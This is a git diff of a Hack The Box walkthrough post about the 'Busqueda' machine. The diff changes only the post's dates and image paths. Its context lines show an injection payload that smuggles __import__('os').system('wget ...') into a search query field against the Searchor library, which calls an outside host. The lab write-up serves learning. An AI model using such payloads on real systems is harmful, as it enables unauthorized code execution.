@@ -1,7 +1,7 @@
 ---
 layout: post
 title: Hack The Box Walkthrough - Busqueda
-date: 2023-04-29
+date: 2023-08-12
 type: post
 tags:
 - Walkthrough
@@ -9,8 +9,8 @@ tags:
 - HackTheBox
 - Easy
 - Machine
-permalink: /2023/04/HTB/Busqueda
-img: 2023/04/Busqueda/Busqueda.png
+permalink: /2023/08/HTB/Busqueda
+img: 2023/08/Busqueda/Busqueda.png
 ---
 
 In this easy box, I exploited a know vulnerability in a Python library and abused a script that used relative paths.
@@ -148,7 +148,7 @@ It did not find any.
 
 I opened a browser to look at the site.
 
-![Search Site](/assets/images/2023/04/Busqueda/SearcherSite.png "Search Site")
+![Search Site](/assets/images/2023/08/Busqueda/SearcherSite.png "Search Site")
 
 The site allowed searching on a list of external sites. You entered a string, and it will reply with the URL to search on the selected site. It also had the option to redirect you directly to the search page of the selected site.
 
@@ -196,7 +196,7 @@ engine=Wired&query=a' + 'b' +  (__import__('os').system('wget 10.10.14.69')) + '
 
 This did not work. I spent a little time trying to get code execution. At some point, I looked at the page and saw that it was built with [Searchor](https://github.com/ArjunSharda/Searchor) 2.4.0.
 
-![Powered by Searchor](/assets/images/2023/04/Busqueda/PoweredBy.png "Powered by Searchor")
+![Powered by Searchor](/assets/images/2023/08/Busqueda/PoweredBy.png "Powered by Searchor")
 
 With that information I quickly found a [Remote Code Execution (RCE) vulnerability](https://github.com/jonnyzar/POC-Searchor-2.4.2) in Searchor. The code from versions 2.4.2 and lower were [using `eval`](https://github.com/ArjunSharda/Searchor/commit/29d5b1f28d29d6a282a5e860d456fab2df24a16b) on the passed in data.
 
